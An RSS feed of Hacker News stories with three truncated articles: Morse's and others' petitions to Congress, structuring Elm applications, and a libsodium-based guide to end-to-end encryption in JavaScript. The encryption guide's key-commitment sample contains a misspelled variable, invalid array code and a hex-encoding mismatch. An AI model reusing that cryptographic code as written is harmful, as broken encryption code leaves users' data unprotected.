<rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0">
    <channel>
        <title>
<![CDATA[Hacker News - Small Sites - Score >= 1]]>
        </title>
        <description>
<![CDATA[Hacker News stories from domains that aren't in the top 1M and that have a score of at least 1. Updated nightly via https://github.com/awendland/hacker-news-small-sites]]>
        </description>
        <link>https://news.ycombinator.com</link>
        <generator>RSS for Node</generator>
        <lastBuildDate>Mon, 16 Nov 2020 12:27:44 GMT</lastBuildDate>
        <atom:link href="https://raw.githubusercontent.com/awendland/hacker-news-small-sites/generated/feeds/hn-small-sites-score-1.xml" rel="self" type="application/rss+xml"></atom:link>
        <pubDate>Mon, 16 Nov 2020 12:27:44 GMT</pubDate>
        <language>
<![CDATA[en-US]]>
        </language>
        <managingEditor>
<![CDATA[me@alexwendland.com (Alex Wendland)]]>
        </managingEditor>
        <ttl>240</ttl>
        <item>
            <title>
<![CDATA[Magnetism and Congress]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25091138">thread link</a>) | @srl
<br/>
November 14, 2020 | https://ineffectivetheory.com/magnetism-congress/ | <a href="https://web.archive.org/web/*/https://ineffectivetheory.com/magnetism-congress/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><header><time datetime="2020-11-14">14 Nov 2020</time></header><h2 id="i">I.</h2><p>In 1842, Morse pressed Congress into allowing him to demonstrate his telegraph by sending a message from one congressional conference room to another. As a result, he was given about a million dollars (inflation-adjusted):</p><blockquote><p><a href="http://memory.loc.gov/cgi-bin/ampage?collId=llsl&amp;fileName=005/llsl005.db&amp;recNum=655"><em>(March 3, 1843)</em></a> Be it enacted… That the sum of thirty thousand dollars be… appropriated… for testing the capacity and usefulness of the system of electro-magnetic telegraphs invented by Samuel F. B. Morse… The Secretary of the Treasury [is] authorized to pay… Morse, and the persons employed under him, such sums of money as he may deem to be a fair compensation…</p></blockquote><p>Today, this seems like an astonishingly implausible story — a single person pesters Congress for a massive sum of money, and <em>gets it</em>.</p><p>This was not Morse’s first demonstration to Congress, though. It took him five years to secure funding.</p><p>In 1837, the Secretary of the Treasury (Levi Woodbury) was instructed by the House to investigate the feasibility of constructing a system of telegraphs for the United States. At the time, “telegraph” generally meant “optical telegraph”; the relays in such a system were humans, who watched one signal and then passed it on. When Woodbury called for proposals, though, Morse replied with his electromagnetic telegraph. This was the beginning of his engagement with Congress.</p><p>In 1838 and 1839, both the House and the Senate considered bills to support the development of Morse’s magnetic telegraph. In the Senate, the issue was whether to allow duty-free importation of construction materials; the House considered a bill for testing the practicality of constructing such a system (presumably with an eye towards directly financing it). Morse demonstrated the system, in 1838, to Congress and the President. Nevertheless, neither bill was ever voted on.</p><p>In 1842, Morse convinced Congress to allow him to demonstrate again. I can’t find any claim that Morse’s second demonstration was noticeably more impressive, but in 1843, Congress finally passed an appropriate for Morse and his colleagues.</p><p>Morse reported in 1844 that the line from the District to Baltimore was complete. Side note: “What hath God wrought” was not, in fact, Morse’s first transmission. The first public transmission, according to wikipedia, was “A patient waiter is no loser”. The famous “What hath God wrought” was the opening line for the D.C.-Baltimore line.</p><p>The Congressional Journal over the next decade is filled with references to petitions and bills for funding expansion of the telegraph system across the country. Congress wasn’t just pleased with the telegraph, though. Morse’s demonstration — and the fact that he delivered on his promises — had made him personally popular. In 1845, the House Committee on Public Buildings and Grounds was instructed to ask Morse</p><blockquote><p>if, in his opinion, he can invent or adopt a more expeditious plan of taking the yeas and nays in this hall…</p></blockquote><p>He seems to have declined, as the House didn’t vote electronically <a href="https://history.house.gov/Exhibitions-and-Publications/Electronic-Technology/House-Technology/">until 1973</a>.</p><p>In 1845, Congress approved an expansion of the telegraph system to New York, and began referring to “Professor Morse” instead of “Samuel F. B. Morse”. In the subsequent years, telegraph lines were often built alongside railroads, funded by Congress in the same bill. By 1870 the magnetic telegraph reached California.</p><p>An astonishing journey, beginning with the audacity of an ordinary man to write to Congress for money.</p><h2 id="ii">II.</h2><p>Or not. To start with, Morse was no ordinary man. He was a consumate self-promoter, intensely concerned with his own reputation, and quite politically active.</p><p>Wikipedia discusses his political activites <a href="https://en.wikipedia.org/wiki/Samuel_Morse">at some length</a>. He published a political tract (explaining how the Catholics were conspiring to take over the country) in 1835. He ran for mayor of New York (to fight the “deep Catholic state”, I assume) in 1836. Note the timeline: neither a prelude nor an afterthought, these activites were essentially contemporary with his creation of the telegraph.</p><p>After the telegraph was well established, in the 1850s, Morse turned his attention to the question of slavery, comparing it favorably to employment, parenting, and government.</p><p>In 1871, H.R. 285 was passed, allowing a statue of Morse to be erected on government land. Morse died in 1872, and a memorial service was held in Congress. I’m assuming this service primarily focused on the telegraph, rather than his paintings (<a href="https://en.wikipedia.org/wiki/Samuel_Morse#/media/File:Samuel_Finley_Breeze_Morse_001.jpg">not bad</a>, actually) or his support for slavey (none too popular with Congress during reconstruction, I guess).</p><h2 id="iii">III.</h2><p>Henry Hall Sherwood was a physician in New York. In the 1830s, the electromagnetic nature of the nervous system was still a relatively new discovery, and Sherwood seems to have gotten a bit over-excited. His <a href="https://collections.nlm.nih.gov/?f%5Bdrep2.authorAggregate%5D%5B%5D=Sherwood%2C+H.+H.+%28Henry+Hall%29">books</a> include case studies; for the most part, he seems to have waved magnets near his patients. He claims this cured them of various ailments. I’d laugh, but there’s an accupuncture clinic a couple blocks from my office. I’m afraid to find out whether this was classified an “essential service” during the lockdown.</p><p>Electromagnetism (or as it was often known then, “magnetism” — even when referring to phenomena we would call electric) was all the rage. A major challenge of the age was to understand the structure of the magnetic field of the Earth, although that’s slightly modern terminology — it was often referred to as “the variation of the compass”. This would be helpful, among other things, for navigation at sea: you can easily imagine that a precise model might allow the measurement of longitude. Sherwood, being an expert on the magnetic nature of the nervous system, decided to lend a hand to this closely related problem. Overall, this went about as well as you’d expect.</p><p>Like his better-known contemporary, Sherwood was bold enough to make requests directly of Congress. He petitioned the House, claiming to have invented an instrument (the <em>geometer</em>) for navigation purely from magnetic observations, and</p><blockquote><p>praying the aid of the Government of the United States in the publication of a work to explain the discoveries…</p></blockquote><p>among other things. It was proposed that he give the House a demonstration of his techniques, in June of 1838. This was voted down, and the matter dropped entirely.</p><p>That same month, Sherwood also petitioned the Senate; his petition was presented by <a href="https://en.wikipedia.org/wiki/Nathaniel_P._Tallmadge">Nathaniel Tallmadge</a> of New York. Like the House, on June 21st, the Senate considered and declined the possiblity of a demonstration. Sherwood’s petition was referred to the Committee on Naval Affairs, which submitted a report, presented again by Tallmadge, to the Senate on July 3rd.</p><p>Here it gets interesting. That report caused something of a stir in the scientific community. No less than <a href="https://en.wikipedia.org/wiki/Joseph_Henry">Joseph Henry</a>, soon to become the first Secretary of the Smithsonian Institution, published a denunciation of the report. You can read his article <a href="https://siarchives.si.edu/sites/default/files/pdfs/JHPVol/JHPP_V4_P75-79_Transcript.pdf">here</a>, which was written in protest</p><blockquote><p>against the plan of discussing such subjects in Congress before proper means have been taken to determine their true character.</p></blockquote><p>In other words, against Congressional meddling and speculation. Most of Henry’s complaint is taken up by a somewhat detailed critique (occasionally, mockery) of Sherwood’s theories. The above quote somewhat masks Henry’s true opinion. A few paragraphs later he writes:</p><blockquote><p>we do not believe that there is a person of any scientific reputation in our country, who has paid attention to this subject, who will not immediately say that the whole affair is perfectly peurile…</p></blockquote><p>Despite his earlier words, I don’t get the impression the Henry would object to Congressional support for a speculative endeavor: just not an entirely futile endeavor. After Henry’s rebuttal was published, the Senate seems to have forgotten about Sherwood’s petition for a while.</p><p>Sherwood again requested financial aid from Congress in mid-February, 1839. Another report was delivered by Tallmadge from his committee, but I can find no details on what it said. It must not have been positive: the last reference to H. H. Sherwood in the papers of Congress is on March 2, 1839, when the Committee on Naval Affairs was given permission, by the Senate, to drop the matter.</p><h2 id="iv">IV.</h2><p>It is sometimes argued that Congress’s support of Morse’s telegraph was not the really the first case in which the new government funded science: for a sufficiently broad definition of “science”, that honor belongs to the Lewis and Clark expedition nearly 40 years prior. But just as Morse’s was not the first time the government <em>considered</em> funding science, the 1803 expedition was not the first time the U.S. government <em>considered</em> funding an expedition.</p><p>John Churchman was <a href="https://bostonraremaps.com/inventory/john-churchman-magnetic-atlas/">a surveyor and mapmaker</a>, who in the 1780s became preoccupied with the task of measuring the longitude of a ship at sea via magnetic observations (much like Sherwood!). Churchman, however, was not a complete crank. Like Morse, he was no stranger to make requests of governments, having (for instance) <a href="https://founders.archives.gov/documents/Jefferson/01-11-02-0378">written</a> to Thomas Jefferson in 1787 to request that a paper of his be presented to the Royal Academy of Sciences at Paris. (That puts things in perspective. There’s no excuse for not sending cold emails!)</p><p>In 1791, Churchman made a request of Congress: “praying the patronage of Government to enable him to undertake a voyage” to investigate the magnetic fields near the geomagnetic north pole. Of course, his <em>motivation</em> for this voyage was to confirm a theory of the behavior of magnetic field lines which is now known to be incorrect. In brief, the behavior of magnetic field lines is not as predictable as he assumed, and therefore not as useful for navigation beyond distinguishing north from south.</p><p>Nevertheless, exploratory voyages based on incorrect assumptions were commonplace and often productive, and Congress considered the matter serious — more seriously, in fact, than the Sherwood business. The House held <a href="http://memory.loc.gov/cgi-bin/ampage?collId=llac&amp;fileName=003/llac003.db&amp;recNum=153">a lengthy discussion</a> on 6 Jan 1792 to consider the petition.</p><p>The representatives (at least those who participate in the debate) come across as reasonably knowledgable about the subject. Halley’s (yes, that Halley) …</p></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://ineffectivetheory.com/magnetism-congress/">https://ineffectivetheory.com/magnetism-congress/</a></em></p>]]>
            </description>
            <link>https://ineffectivetheory.com/magnetism-congress/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25091138</guid>
            <pubDate>Sat, 14 Nov 2020 09:15:42 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How I write Elm applications]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25091132">thread link</a>) | @galfarragem
<br/>
November 14, 2020 | https://jezenthomas.com/how-i-write-elm-applications/ | <a href="https://web.archive.org/web/*/https://jezenthomas.com/how-i-write-elm-applications/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  <article>
    
    <p>
      <span>November  7, 2020</span>
      
      | Gdańsk, Poland
      
    </p>
    <p>Most of my work over the past 10 years has involved writing what is often called a <em>wizard</em>.</p>
<p>A wizard is essentially a multi-step process that guides a user through a particular workflow. For example, if you are installing a new application on your computer, the wizard might guide you through the following process:</p>
<ol type="1">
<li>Enter your license registration details</li>
<li>Agree to the software author’s legal terms</li>
<li>Specify an installation location</li>
</ol>
<p>Most web applications provide something similar. If a user needs to input a large amount of data for the application to then run a bunch of calculations, you could of course just provide the user with one big web form. At a certain size though, a single web form can be intimidating and provide a less than ideal user experience. The canonical way to improve the user experience here is to break up the web form into several separate pages. This is another example of a wizard.</p>
<figure>
<img src="https://jezenthomas.com/static/img/wizard-diagram.jpg" alt="Forms are easier to digest when they’re split into separate steps"><figcaption>Forms are easier to digest when they’re split into separate steps</figcaption>
</figure>
<p>I’ve tried writing wizards in a number of different web technologies, and so far Elm has proven itself as by far the most robust and painless, <em>especially</em> when it inevitably comes to changing some conditional logic to meet the mutable needs of various business processes.</p>
<p>For any small Elm application, project structure is easy. There is no reason why a 1,000 line Elm application can’t live in a single file. In fact this is really how every Elm application ought to begin its life. Start with a single file with the usual boilerplate and the following contents:</p>
<ul>
<li>A single sum type to model all of the messages your application supports</li>
<li>A single model which contains all the application state</li>
<li>A single update function for advancing the application state</li>
<li>A single view function for rendering the application state on the page</li>
</ul>
<p>If your web form is complex enough to warrant being broken into separate pages however, then your application is naturally not going to consist of a small number of lines of code. A common concern among less experienced Elm programmers is that one big sum type for all of your messages becomes unwieldy to maintain. The same is said of having one big shallow record for all of the application state, or one big <code>update</code> function to match all the constructors of the one big <code>Msg</code> type. This is where unnecessary complexity starts to balloon as programmers add <em>clever</em> abstractions and misdirections, usually involving both <code>Html.map</code> and <code>Cmd.map</code>, separate <code>update</code> functions for each logical subsection of your application (usually with noticeably awkward type signatures), and some vague hand-waving in the direction of <em>encapsulation</em> and so-called <em>Clean Code</em>.</p>
<p>I’d argue that this kind of misdirection is almost <em>never</em> what you want. I’d argue further that this applies <em>especially</em> to you if your background is in maintaining complex React/Angular applications, where invented complexity is the status quo and this kind of misdirection is simply what you have become desensitised to.</p>
<p>So if the combination of <code>Html.map</code> and <code>Cmd.map</code> are to be avoided, how can we scale an Elm application without sacrificing developer ergonomics? In short, the tricks to employ are:</p>
<ul>
<li>Nested sum types</li>
<li>Nested record types</li>
<li>Nested update functions</li>
<li>Small, composable view functions</li>
<li>Function composition</li>
<li>Lenses</li>
</ul>
<p>Let’s take a look at a more concrete application of these ideas. As an example, we can model the process of a person applying for a bank loan.</p>
<p>The bank will want to ask the applicant a whole bunch of questions, which we could group into three categories:</p>
<ol type="1">
<li>Personal information</li>
<li>Details on the purpose of the loan</li>
<li>Financial information and creditworthiness</li>
</ol>
<p>This would suggest a three-step wizard or a three-page web form. A reasonable place to begin splitting our application apart into three smaller pieces is in our <code>Msg</code> type.</p>
<h2 id="the-big-msg-type">The Big Msg Type</h2>
<p>The naïve way to model the messages our application should support is with one big sum type, which might look something like this:</p>
<pre><code>type Page
  = PersonalInformationPage
  | LoanPurposePage
  | FinancialDetailsPage

type Msg
  -- System-wide messages
  = NoOp
  | SetPage Page
  -- etc…

  -- Personal information
  | SetFirstName String
  | SetLastName String
  | SetAddressLine1 String
  -- …more messages for the personal information page

  -- Purpose of the loan
  | SetPurchaseItemCategory
  | SetPurchaseItemEstimatedValue
  -- …more messages for the loan purpose page

  -- Financial information
  | SetMonthlyIncomeBeforeTax
  | SetMonthlyRentPayment
  -- …more messages about the applicant's financial details</code></pre>
<p>This <em>does</em> work, but at some point it becomes cumbersome to support a large number of constructors. The value for “large” is of course determined by the individual programmer’s personal taste and/or pain threshold. To ease this pain, people typically <em>extract</em> groups of messages into their own separate sum types, which subsequently forces them to write update functions that return a type <em>other</em> than the top-level <code>Msg</code> type.</p>
<p><em>Don’t do that!</em></p>
<p>The way to break these groups of constructors out is by first nesting them inside the <code>Msg</code> type, like this:</p>
<pre><code>type PersonalInformationMsg
  = SetFirstName String
  | SetLastName String
  | SetAddressLine1 String
  -- etc..

type LoanPurposeMsg -- etc…

type FinancialDetailsMsg -- etc…

type Msg
  = NoOp
  | SetPage Page
  | PersonalInformationMsg PersonalInformationMsg
  | LoanPurposeMsg LoanPurposeMsg
  | FinancialDetailsMsg FinancialDetailsMsg</code></pre>
<p>The new message types can live in the same file as the top-level <code>Msg</code> type. They can also be extracted to different files. That’s your choice.</p>
<p>The next thing to tackle is our <code>update</code> function, since it needs to mirror our <code>Msg</code> type.</p>
<h2 id="nested-update-functions">Nested Update Functions</h2>
<p>I’ve seen people advocate for page-specific <code>update</code> functions which take a page-specific model and return a tuple of that page-specific model and a page-specific <code>Cmd Msg</code> equivalent. This is typically where you see <code>Cmd.map</code> sneaking in. These functions almost inevitably end up needing <em>something</em> from the top-level application-wide state, so you’ll often see some type signature like this:</p>
<pre><code>updatePersonalInformation
   : PersonalInformationMsg
  -&gt; Model
  -&gt; (PersonalInformationModel, Cmd PersonalInformationMsg)
  -&gt; (Model, Cmd Msg)</code></pre>
<p>This is <em>way</em> too complex already, and this approach doesn’t even actually buy you anything.</p>
<p>The far simpler way to do this is to have every nested <code>update</code> function take a page-specific message, the <em>entire</em> application state, and return the same type for that state along with the top-level <code>Msg</code> type, like this:</p>
<pre><code>updatePersonalInformation : PersonalInformationMsg -&gt; Model -&gt; (Model, Cmd Msg)
updatePersonalInformation msg model = case msg of
  SetFirstName a    -&gt; -- …
  SetLastName a     -&gt; -- …
  SetAddressLine1 a -&gt; -- …
  -- etc…

update : Msg -&gt; Model -&gt; (Model, Cmd Msg)
update msg model = case msg of
  NoOp -&gt; (model, Cmd.none)
  SetPage page -&gt; ({ model | page = page }, Cmd.none)
  PersonalInformationMsg subMsg -&gt; updatePersonalInformation subMsg model
  LoanPurposeMsg subMsg -&gt; updateLoanPurpose subMsg model
  FinancialDetailsMsg subMsg -&gt; updateFinancialDetails subMsg model</code></pre>
<p>No complicated type signatures. No juggling of message types. No <code>Cmd.map</code>. Easy.</p>
<p>Of course the whole point of our <code>update</code> function is to advance the state of our model, and the structure of that model is also something that can swell and become unwieldy, so that’s what we will dissect next.</p>
<h2 id="record-surgery">Record Surgery</h2>
<p>Near the inception of the project, all of our individual bits of state might exist at the top level of our <code>Model</code>, which is typically represented as a record. Perhaps something like this:</p>
<pre><code>type alias Model =
  { page : Page
  , firstName : String
  , lastName : String
  , addressLine1 : String
  -- …more personal information fields

  , purchaseItemCategory : ItemCategory
  , purchaseItemEstimatedValue : Money
  -- …more loan purpose fields…

  -- …and also financial details, and system-wide state, etc…
  }</code></pre>
<p>Like the parts of our project we’ve addressed previously, this also can turn into a bit of a mess as it grows. Both application-wide data and page-specific data are mixed in together which feels a bit haphazard. Fortunately, grouping and extracting these fields is typically rather intuitive. We can start by grouping page-specific parts of the state together, and then group further until it no longer <em>feels</em> messy.</p>
<pre><code>type alias Address =
  { line1 : String
  , line2 : String
  , city : String
  , postcode : String
  -- …
  }

type alias PersonalInformation =
  { firstName : String
  , lastName : String
  , address : Address
  -- …
  }

type alias LoanPurpose =
  { purchaseItemCategory : ItemCategory
  , purchaseItemEstimatedValue : Money
  -- …
  }

type alias FinancialDetails = -- …

type alias Model =
  { page : Page
  , personalInformation : PersonalInformation
  , loanPurpose : LoanPurpose
  , financialDetails : FinancialDetails
  }</code></pre>
<p>The problem now however is that when we wish to update a deeply-nested field, we need to write all of the code to unwrap each level until we arrive at the depth we need. Illustrated another way, let’s say we want to update the first line of the applicant’s address.</p>
<p>Retrieving the value of this field is no problem, as we can use Elm’s dot syntax to succinctly get us all the way there, like this:</p>
<pre><code>model.personalInformation.address.line1</code></pre>
<p>What we <em>can’t</em> do here however is <em>update</em> that field in a similar fashion, <em>i.e.</em>, Elm won’t allow us to write something like this:</p>
<pre><code>-- This won't work
{ model.personalInformation.address | line1 = newLine1 }

-- This also won't work
{ model | personalInformation.address.line1 = newLine1 }</code></pre>
<p>The naïve way to unwrap and subsequently update the field in this record is to write something like this:</p>
<pre><code>updatePersonalInformation : PersonalInformationMsg -&gt; Model -&gt; (Model, Cmd Msg)
updatePersonalInformation msg model = case msg of
  SetFirstName _ -&gt; -- …

  SetLastName _ -&gt; -- …

  SetAddressLine1 newLine1 -&gt;
    let
        …</code></pre></article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://jezenthomas.com/how-i-write-elm-applications/">https://jezenthomas.com/how-i-write-elm-applications/</a></em></p>]]>
            </description>
            <link>https://jezenthomas.com/how-i-write-elm-applications/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25091132</guid>
            <pubDate>Sat, 14 Nov 2020 09:11:03 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Going Bark: A Furry's Guide to End-to-End Encryption]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25090942">thread link</a>) | @some_furry
<br/>
November 14, 2020 | https://soatok.blog/2020/11/14/going-bark-a-furrys-guide-to-end-to-end-encryption/ | <a href="https://web.archive.org/web/*/https://soatok.blog/2020/11/14/going-bark-a-furrys-guide-to-end-to-end-encryption/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

		<div>

			
<p>Governments are back on their anti-encryption bullshit again.</p>



<p>Between the <a href="https://blog.cryptographyengineering.com/2020/03/06/earn-it-is-an-attack-on-encryption/">U.S. Senate’s “EARN IT” Act</a>, the <a href="https://www.eff.org/deeplinks/2020/10/orders-top-eus-timetable-dismantling-end-end-encryption">E.U.’s slew of anti-encryption proposals</a>, and <a href="https://fee.org/articles/australia-s-unprecedented-encryption-law-is-a-threat-to-global-privacy/">Australia’s new anti-encryption law</a>, it’s become clear that the authoritarians in office view online privacy as a threat to their existence.</p>



<p>Normally, when the governments increase their anti-privacy sabre-rattling, technologists start talking more loudly about Tor, Signal, and other privacy technologies (usually only to be drowned out by paranoid people who think Tor and Signal are government backdoors or something stupid; conspiracy theories ruin everything!).</p>



<p><strong>I’m not going to do that.</strong></p>



<p>Instead, I’m going to show you how to add end-to-end encryption to any communication software you’re developing. (Hopefully, I’ll avoid making <a href="https://soatok.blog/2020/10/28/bizarre-design-choices-in-zooms-end-to-end-encryption/">any bizarre design decisions</a> along the way.)</p>



<p>But first, some important disclaimers:</p>



<ol><li><strong>Yes, you should absolutely do this.</strong> I don’t care how banal your thing is; if you expect people to use it to communicate with each other, you should make it so that you can never decrypt their communications.</li><li>You should absolutely NOT bill the thing you’re developing as an <em>alternative</em> to Signal or WhatsApp.</li><li>The goal of doing this is to increase the amount of end-to-end encryption deployed on the Internet that the service operator cannot decrypt (even if compelled by court order) and make E2EE normalized. The goal is NOT to compete with highly specialized and peer-reviewed privacy technology.</li><li>I am not a lawyer, I’m some furry who works in cryptography. The contents of this blog post is not legal advice, nor is it endorsed by any company or organization. Ask the <a href="https://eff.org/">EFF</a> for legal questions.</li></ol>



<p>The organization of this blog post is as follows: First, I’ll explain <a href="#symmetric-key-encryption">how to encrypt and decrypt data between users</a>, assuming you have a key. Next, I’ll explain <a href="#key-agreement">how to build an authenticated key exchange</a> and <a href="#session-key-management">a ratcheting protocol to determine the keys used in the first step</a>. Afterwards, I’ll explore <a href="#identity-key-management">techniques for binding authentication keys to identities and managing trust</a>. Finally, I’ll discuss <a href="#backdoor-resistance">strategies for making it impractical to ever backdoor your software (and impossible to silently backdoor it)</a>, just to piss <a href="https://en.wikipedia.org/wiki/Five_Eyes">the creeps and tyrants of the world</a> off even more.</p>



<p>You don’t have to implement the full stack of solutions to protect users, but the further you can afford to go, the safer your users will be from privacy-invasive policing.</p>







<h2 id="preliminaries">Preliminaries</h2>



<h3 id="choosing-a-cryptography-library">Choosing a Cryptography Library</h3>



<p>In the examples contained on this page, I will be using the <a href="https://libsodium.gitbook.io/doc/">Sodium cryptography library</a>. Specifically, my example code will be written with the <a href="https://github.com/paragonie/sodium-plus">Sodium-Plus</a> library for JavaScript, since it strikes a good balance between performance and being cross-platform.</p>



<pre><code>const { SodiumPlus } = require('sodium-plus');

(async function() {
     // Select a backend automatically
     const sodium = await SodiumPlus.auto();
     
     // Do other stuff here
})();</code></pre>



<p>Libsodium is <a href="https://latacora.micro.blog/2018/04/03/cryptographic-right-answers.html">generally the correct choice for developing cryptography features in software</a>, and is available in most programming languages,</p>



<p>If you’re prone to choose a different library, you should consult your cryptographer (and yes, you should have one on your payroll if you’re doing things different) about your design choices.</p>



<h3>Threat Modelling</h3>



<p>Remember above when I said, “You don’t have to implement the full stack of solutions to protect users, but the further you can afford to go, the safer your users will be from privacy-invasive policing”?</p>



<p>How far you go in implementing the steps outlined on this blog post should be informed by <a href="https://adamcaudill.com/2016/07/20/threat-modeling-for-applications/">a threat model</a>, not an ad hoc judgment.</p>



<p>For example, if you’re encrypting user data and storing it in the cloud, you probably want to pass <a href="https://blog.cryptographyengineering.com/2012/04/05/icloud-who-holds-key/">the Mud Puddle Test</a>:</p>



<blockquote><div><p>1. First, drop your device(s) in a mud puddle.<br>2. Next, slip in said puddle and crack yourself on the head. When you regain consciousness you’ll be perfectly fine, but<em>&nbsp;won’t for the life of you&nbsp;</em>be able to&nbsp;recall your device passwords or keys.<br>3. Now try to get your cloud data back.</p><p>Did you succeed? If so, you’re screwed. Or to be a bit less dramatic, I should say: your cloud provider has access to your ‘encrypted’ data, as does the government if they want it, as does any rogue employee who knows their way around your provider’s internal policy checks.</p></div><cite>Matthew Green describes the Mud Puddle Test, which Apple products <a href="https://sneak.berlin/20201112/your-computer-isnt-yours/">definitely don’t pass</a>.</cite></blockquote>



<p>If you must fail the Mud Puddle Test for your users, make sure you’re clear and transparent about this in the documentation for your product or service.</p>







<h2 id="symmetric-key-encryption">I. Symmetric-Key Encryption</h2>



<p>The easiest piece of this puzzle is to encrypt data in transit between both ends (thus, satisfying the loosest definition of end-to-end encryption).</p>



<p>At this layer, you already have some kind of symmetric key to use for encrypting data before you send it, and for decrypting it as you receive it.</p>



<p>For example, the following code will encrypt/decrypt strings and return hexadecimal strings with a version prefix.</p>


<pre title="">const VERSION = "v1";

/**
 * @param {string|Uint8Array} message
 * @param {Uint8Array} key
 * @param {string|null} assocData
 * @returns {string}
 */
async function encryptData(message, key, assocData = null) {
    const nonce = await sodium.randombytes_buf(24);
    const aad = JSON.stringify({
      'version': VERSION,
      'nonce': await sodium.sodium_bin2hex(nonce),
      'extra': assocData
    });

    const encrypted = await sodium.crypto_aead_xchacha20poly1305_encrypt(
        message,
        nonce,
        key,
        aad
    );
    return (
       VERSION +
       await sodium.sodium_bin2hex(nonce) +
       await sodium.sodium_bin2hex(encrypted)
    );
}

/**
 * @param {string|Uint8Array} message
 * @param {Uint8Array} key
 * @param {string|null} assocData
 * @returns {string}
 */
async function decryptData(encrypted, key, assocData = null) {
    const ver = encrypted.slice(0, 2);
    if (!await sodium.sodium_memcmp(ver, VERSION)) {
        throw new Error("Incorrect version: " + ver);
    }
    const nonce = await sodium.sodium_hex2bin(encrypted.slice(2, 50));
    const ciphertext = await sodium.sodium_hex2bin(encrypted.slice(50));
    const aad = JSON.stringify({
      'version': ver,
      'nonce': encrypted.slice(2, 50),
      'extra': assocData
    });
    
    const plaintext = await sodium.crypto_aead_xchacha20poly1305_decrypt(
        ciphertext,
        nonce,
        key,
        aad
    );
    return plaintext.toString('utf-8');
}
</pre>


<p>Under-the-hood, this is using <a href="https://soatok.blog/2020/07/12/comparison-of-symmetric-encryption-methods/#aes-gcm-vs-xchacha20poly1305">XChaCha20-Poly1305</a>, which is less sensitive to timing leaks than AES-GCM. However, like AES-GCM, this encryption mode doesn’t provide <a href="https://eprint.iacr.org/2019/016">message- or key-commitment</a>.</p>



<p>If you want key commitment, you should derive two keys from <code>$key</code> using a KDF based on hash functions: One for actual encryption, and the other <a href="https://eprint.iacr.org/2020/1153">as a key commitment value</a>.</p>



<p>If you want message commitment, you can use AES-CTR + HMAC-SHA256 or XChaCha20 + BLAKE2b-MAC.</p>



<p>If you want both, ask <a href="https://mumble.net/~campbell/">Taylor Campbell</a> about his BLAKE3-based design.</p>



<p>A modified version of the above code with key-commitment might look like this:</p>


<pre title="">const VERSION = "v2";

/**
 * Derive an encryption key and a commitment hash.
 * @param {CryptographyKey} key
 * @param {Uint8Array} nonce
 * @returns {{encKey: CryptographyKey, commitment: Uint8Array}}
 */
async function deriveKeys(key, nonce) {
    const encKey = new CryptographyKey(await sodium.crypto_generichash(
        new Uint8Array([0x01].append(nonce)),
        key
    ));
    const commitment = await sodium.crypto_generichash(
        new Uint8Array([0x02].append(nonce)),
        key
    );
    return {encKey, commitment};
}

/**
 * @param {string|Uint8Array} message
 * @param {Uint8Array} key
 * @param {string|null} assocData
 * @returns {string}
 */
async function encryptData(message, key, assocData = null) {
    const nonce = await sodium.randombytes_buf(24);
    const aad = JSON.stringify({
      'version': VERSION,
      'nonce': await sodium.sodium_bin2hex(nonce),
      'extra': assocData
    });
    const {encKey, commitment} = await deriveKeys(key, nonce);

    const encrypted = await sodium.crypto_aead_xchacha20poly1305_encrypt(
        message,
        nonce,
        encKey,
        aad
    );
    return (
       VERSION +
       await sodium.sodium_bin2hex(nonce) +
       commitmment +
       await sodium.sodium_bin2hex(encrypted)
    );
}

/**
 * @param {string|Uint8Array} message
 * @param {Uint8Array} key
 * @param {string|null} assocData
 * @returns {string}
 */
async function decryptData(encrypted, key, assocData = null) {
    const ver = encrypted.slice(0, 2);
    if (!await sodium.sodium_memcmp(ver, VERSION)) {
        throw new Error("Incorrect version: " + ver);
    }
    const nonce = await sodium.sodium_hex2bin(encrypted.slice(2, 50));
    const ciphertext = await sodium.sodium_hex2bin(encrypted.slice(114));
    const aad = JSON.stringify({
      'version': ver,
      'nonce': encrypted.slice(2, 50),
      'extra': assocData
    });
    const storedCommitment = await sodium.sodium_hex2bin(encrypted.slice(50, 114));
    const {encKey, commitment} = await deriveKeys(key, nonce);
    if (!sodium.sodium_memcmp(storedCommitment, commitment)) {
        throw new Error("Incorrect commitment value");
    }
    
    const plaintext = await sodium.crypto_aead_xchacha20poly1305_decrypt(
        ciphertext,
        nonce,
        encKey,
        aad
    );
    return plaintext.toString('utf-8');
}
</pre>


<p>Another design choice you might make is to encode ciphertext with base64 instead of hexadecimal. That doesn’t significantly alter the design here, but it does mean your decoding logic has to accommodate this.</p>



<p>You SHOULD version your ciphertexts, and include this in the AAD provided to your AEAD encryption mode. I used “v1” and “v2” as a version string above, but you can use your software name for that too.</p>



<h2 id="key-agreement">II. Key Agreement</h2>



<p>If you’re not familiar with <a href="https://soatok.blog/2020/04/21/elliptic-curve-diffie-hellman-for-humans-and-furries/">Elliptic Curve Diffie-Hellman</a> or <a href="https://soatok.blog/2020/04/21/authenticated-key-exchanges/">Aut…</a></p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://soatok.blog/2020/11/14/going-bark-a-furrys-guide-to-end-to-end-encryption/">https://soatok.blog/2020/11/14/going-bark-a-furrys-guide-to-end-to-end-encryption/</a></em></p>]]>
            </description>
            <link>https://soatok.blog/2020/11/14/going-bark-a-furrys-guide-to-end-to-end-encryption/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25090942</guid>
            <pubDate>Sat, 14 Nov 2020 08:04:17 GMT</pubDate>
        </item>
        <item>
            <title>
